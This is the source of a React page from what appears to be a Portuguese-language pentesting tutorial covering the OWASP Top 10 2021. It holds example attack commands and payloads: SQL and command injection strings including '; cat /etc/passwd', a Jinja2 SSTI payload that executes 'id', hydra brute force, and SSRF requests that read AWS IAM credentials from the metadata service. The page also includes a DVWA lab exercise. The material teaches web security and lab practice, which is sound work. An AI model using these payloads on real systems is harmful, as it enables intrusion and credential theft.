import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function OwaspTop10() {
  return (
    <PageContainer
      title="OWASP Top 10 — As 10 vulnerabilidades web"
      subtitle="Mapa do que QUASE TODO pentest web encontra. Baseado no OWASP Top 10 2021."
      difficulty="iniciante"
      timeToRead="18 min"
    >
      <h2>O que é o Top 10</h2>
      <p>
        Lançado pela <a href="https://owasp.org" target="_blank" rel="noreferrer">OWASP</a>,
        é o ranking das 10 categorias de vulnerabilidade mais críticas em aplicações web.
        Toda checklist de pentest começa por elas. A versão atual é a <strong>2021</strong>{" "}
        — uma nova é esperada para 2025/2026.
      </p>

      <OutputBlock label="Top 10 — 2021 em uma vista" type="info">
{`A01:2021  Broken Access Control               (94% das apps testadas tinham)
A02:2021  Cryptographic Failures               (antes "Sensitive Data Exposure")
A03:2021  Injection                            (SQLi, NoSQLi, OS-cmd, LDAP)
A04:2021  Insecure Design                      (NOVA — falha de arquitetura)
A05:2021  Security Misconfiguration            (configs default, headers ruins)
A06:2021  Vulnerable & Outdated Components     (libs com CVE)
A07:2021  Identification & Auth Failures       (login fraco, session bug)
A08:2021  Software & Data Integrity Failures   (NOVA — supply chain, deserial)
A09:2021  Security Logging & Monitoring Failures
A10:2021  Server-Side Request Forgery (SSRF)   (NOVA categoria)`}
      </OutputBlock>

      <h2>A01 — Broken Access Control</h2>
      <p>O número 1: usuário acessa o que não deveria. IDOR, missing auth, force browsing.</p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "exemplo IDOR — trocar ID de outro usuário",
            cmd: "curl -s -b 'session=meu_token' https://app.com/api/orders/501",
            out: `{
  "id": 501,
  "user_id": 99,           ← MEU id
  "items": [...],
  "total": 142.00
}`,
            outType: "info",
          },
          {
            cmd: "curl -s -b 'session=meu_token' https://app.com/api/orders/502",
            out: `{
  "id": 502,
  "user_id": 100,          ← OUTRO usuário, mas eu vi
  "items": [...],
  "total": 89.50,
  "shipping": "Rua X, 123"
}`,
            outType: "error",
          },
        ]}
      />

      <h2>A02 — Cryptographic Failures</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "TLS fraco / ausente",
            cmd: "testssl https://app.com",
            out: `Testing protocols via sockets except NPN+ALPN

 SSLv2      not offered (OK)
 SSLv3      not offered (OK)
 TLS 1      offered (NOT ok)         ← deveria estar desligado
 TLS 1.1    offered (NOT ok)         ← deveria estar desligado
 TLS 1.2    offered (OK)
 TLS 1.3    offered (OK)

 Testing cipher categories
 NULL ciphers (no encryption)              not offered (OK)
 Anonymous NULL Ciphers (no auth)          not offered (OK)
 Export ciphers (w/o ADH+NULL)             offered (NOT ok)  ← FRACO`,
            outType: "warning",
          },
          {
            comment: "senha em texto puro no banco",
            cmd: "sqlmap -u 'https://app.com/login.php?id=1' --dump -T users",
            out: `Database: webapp
Table: users
[3 entries]
+----+--------+----------+
| id | name   | password |
+----+--------+----------+
| 1  | admin  | admin123 |
| 2  | jsmith | abc123   |
| 3  | maria  | senha    |
+----+--------+----------+`,
            outType: "error",
          },
        ]}
      />

      <h2>A03 — Injection</h2>
      <CommandTable
        title="Tipos de injection"
        variations={[
          { cmd: "SQL Injection", desc: "Concatenação direta de input em SQL.", output: "' OR '1'='1' -- " },
          { cmd: "NoSQL Injection", desc: "Filtros JSON em MongoDB/CouchDB.", output: '{"$ne": null}' },
          { cmd: "Command Injection", desc: "Input vai para shell.", output: "; cat /etc/passwd" },
          { cmd: "LDAP Injection", desc: "Filtro LDAP montado com input.", output: "*)(uid=*))(|(uid=*" },
          { cmd: "XPath Injection", desc: "Query XML.", output: "' or '1'='1" },
          { cmd: "Template Injection (SSTI)", desc: "Engine de template avalia input.", output: "{{7*7}} → 49" },
          { cmd: "Header Injection", desc: "CRLF em headers HTTP.", output: "%0d%0aSet-Cookie: x=1" },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "SSTI clássico em Jinja2",
            cmd: "curl -G 'https://app.com/render' --data-urlencode 'name={{7*7}}'",
            out: `<h1>Hello 49</h1>`,
            outType: "warning",
          },
          {
            cmd: "curl -G 'https://app.com/render' --data-urlencode 'name={{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read()}}'",
            out: `<h1>Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)
</h1>`,
            outType: "error",
          },
        ]}
      />

      <h2>A04 — Insecure Design</h2>
      <p>
        Falha NÃO é de código mas de <strong>desenho</strong>: workflow que permite "burlar"
        a regra (ex: cupom -100% no e-commerce, esqueceu validação de quantidade no checkout,
        timer de troca de senha sem rate-limit).
      </p>

      <h2>A05 — Security Misconfiguration</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "curl -sI https://app.com",
            out: `HTTP/2 200
server: Apache/2.4.41 (Ubuntu)         ← banner expondo versão
x-powered-by: PHP/7.4.3                ← idem
content-type: text/html

(faltando todos esses headers de segurança:)
strict-transport-security
content-security-policy
x-frame-options
x-content-type-options
referrer-policy`,
            outType: "warning",
          },
          {
            comment: "diretórios e arquivos default expostos",
            cmd: "ffuf -u https://app.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302",
            out: `[Status: 200, Size: 542]    .env
[Status: 200, Size: 1245]   .git/HEAD
[Status: 301, Size: 0]      backup
[Status: 200, Size: 9821]   server-status
[Status: 200, Size: 4231]   phpinfo.php
[Status: 200, Size: 2451]   phpmyadmin/`,
            outType: "error",
          },
        ]}
      />

      <h2>A06 — Vulnerable & Outdated Components</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "wpscan --url https://blog.com --enumerate vp,vt --api-token YOUR_TOKEN",
            out: `[+] WordPress version 5.7.2 identified (Outdated, released on 2021-05-12)
[+] WordPress theme in use: divi 4.6.5 (latest version: 4.21.0)
[+] Enumerating Vulnerable Plugins:
 | [!] revslider 3.0.95 — Authenticated Arbitrary File Download (CVE-2024-34537)
 | [!] elementor 3.6.2 — Stored XSS (CVE-2022-1329)
 | [!] wp-file-manager 6.9 — Unauthenticated RCE (CVE-2020-25213)
[+] Enumerating Vulnerable Themes:
 | [!] divi 4.6.5 — Cross-Site Scripting (CVE-2023-7116)`,
            outType: "error",
          },
          {
            cmd: "nuclei -u https://app.com -t cves/ -severity high,critical",
            out: `[INF] Templates loaded for current scan: 8421
[INF] Targets loaded for current scan: 1
[CVE-2024-3094] [http] [critical] https://app.com - XZ Utils 5.6.0/5.6.1 backdoor
[CVE-2023-46805] [http] [critical] https://app.com - Ivanti Connect Secure path traversal
[CVE-2024-23897] [http] [critical] https://app.com - Jenkins arbitrary file read`,
            outType: "warning",
          },
        ]}
      />

      <h2>A07 — Authentication Failures</h2>
      <CommandTable
        title="Cheiros típicos"
        variations={[
          { cmd: "Sem rate-limit no login", desc: "Permite brute force.", output: "Hydra/medusa funciona." },
          { cmd: "Sessão sem rotação após login", desc: "Session fixation.", output: "Atacante força ID antes do login." },
          { cmd: "Cookie sem HttpOnly/Secure/SameSite", desc: "XSS rouba sessão fácil.", output: "Sempre verifique." },
          { cmd: "Reset de senha previsível", desc: "Token sequencial / com timestamp.", output: "Force browsing → reset de outro." },
          { cmd: "MFA bypass", desc: "Permite pular 2FA via segundo endpoint.", output: "Use Burp Repeater para testar." },
          { cmd: "Default credentials", desc: "admin/admin, root/toor, tomcat/tomcat.", output: "Sempre tente!" },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.5 ssh -t 4 -V",
            out: `[ATTEMPT] target 10.10.10.5 - login "admin" - pass "123456"
[ATTEMPT] target 10.10.10.5 - login "admin" - pass "password"
[ATTEMPT] target 10.10.10.5 - login "admin" - pass "12345"
[22][ssh] host: 10.10.10.5   login: admin   password: P@ssw0rd!
[STATUS] attack finished for 10.10.10.5 (valid pair found)`,
            outType: "warning",
          },
        ]}
      />

      <h2>A08 — Software & Data Integrity Failures</h2>
      <CodeBlock
        language="javascript"
        title="exemplo: importar JS de CDN sem SRI (Subresource Integrity)"
        code={`<!-- INSEGURO: se o CDN for comprometido, JS malicioso cai no seu site -->
<script src="https://cdn.example.com/lib.js"></script>

<!-- SEGURO: SRI valida o hash do arquivo -->
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-abc123..."
        crossorigin="anonymous"></script>`}
      />

      <p>
        Outro caso: <strong>desserialização insegura</strong> (PHP unserialize, Java
        ObjectInputStream). Veja <a href="#/deserialization"><strong>página dedicada</strong></a>.
      </p>

      <h2>A09 — Logging & Monitoring Failures</h2>
      <p>Não é técnica de exploração — é a ausência dela que permite ao atacante operar invisível.</p>
      <OutputBlock label="checklist mínimo de logging" type="default">
{`☐ Logins (ok e falhos) com IP + timestamp + user-agent
☐ Tentativas de acesso a recursos sem permissão (403)
☐ Mudanças de privilégio / role
☐ Erros de validação de input com payloads (XSS, SQL)
☐ Uso de funções administrativas
☐ Alterações em dados críticos (financeiro, PII)
☐ Logs centralizados (não no servidor que pode ser comprometido)
☐ Retenção mínima de 90 dias
☐ Alertas em tempo real para eventos críticos`}
      </OutputBlock>

      <h2>A10 — Server-Side Request Forgery (SSRF)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "app permite que servidor 'baixe' uma URL passada pelo usuário",
            cmd: "curl -G 'https://app.com/fetch' --data-urlencode 'url=http://example.com'",
            out: `HTTP/1.1 200 OK
{"content": "<html><body>Example Domain</body></html>"}`,
            outType: "default",
          },
          {
            comment: "atacante aponta para serviços internos",
            cmd: "curl -G 'https://app.com/fetch' --data-urlencode 'url=http://localhost:8080/admin'",
            out: `{"content": "<h1>Internal Admin Panel</h1>...<form>..."}`,
            outType: "warning",
          },
          {
            comment: "ainda pior: AWS metadata service",
            cmd: "curl -G 'https://app.com/fetch' --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
            out: `{"content": "ec2-instance-role"}`,
            outType: "error",
          },
          {
            cmd: "curl -G 'https://app.com/fetch' --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance-role'",
            out: `{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA....",
  "SecretAccessKey": "wJalr...",
  "Token": "FwoG...",
  "Expiration": "2026-04-03T20:14:23Z"
}`,
            outType: "error",
          },
        ]}
      />

      <p>Veja a página dedicada: <a href="#/ssrf"><strong>SSRF</strong></a>.</p>

      <PracticeBox
        title="Mini-pentest OWASP em DVWA"
        goal="Validar pelo menos 5 das 10 categorias do Top 10 em laboratório (Damn Vulnerable Web App)."
        steps={[
          "Suba o DVWA local (docker run --rm -it -p 8080:80 vulnerables/web-dvwa).",
          "Login admin/password, dificuldade Low.",
          "Teste cada módulo: Brute Force (A07), Command Injection (A03), File Upload (A05/A03), SQL Injection (A03), XSS (A03), CSRF (A01).",
          "Anote tempo, payload e impacto.",
        ]}
        command={`docker run --rm -d -p 8080:80 vulnerables/web-dvwa
firefox http://localhost:8080 &

# Default creds: admin / password
# Setup → Create Database → Login`}
        expected={`Brute Force:        admin/password (admin)
Command Injection:  127.0.0.1; id  → uid=33(www-data)
SQL Injection:      ' OR '1'='1' --     → todos os usuários
File Upload:        upload de shell.php  → RCE
XSS Reflected:      <script>alert(1)</script>
XSS Stored:         (idem, persiste no banco)
CSRF:               formulário sem token`}
        verify="Em modo Low, todas as 10 categorias do DVWA devem cair em poucos minutos. Suba para Medium/High e tente quebrar — esse é o exercício real."
      />

      <AlertBox type="info" title="Use o Top 10 como checklist, não como teto">
        O Top 10 cobre o que mais aparece, não o que é mais grave. Em alvos modernos
        considere também: <strong>OWASP API Top 10</strong>, <strong>OWASP MASVS</strong> (mobile),
        <strong> OWASP LLM Top 10</strong> (apps com IA).
      </AlertBox>
    </PageContainer>
  );
}
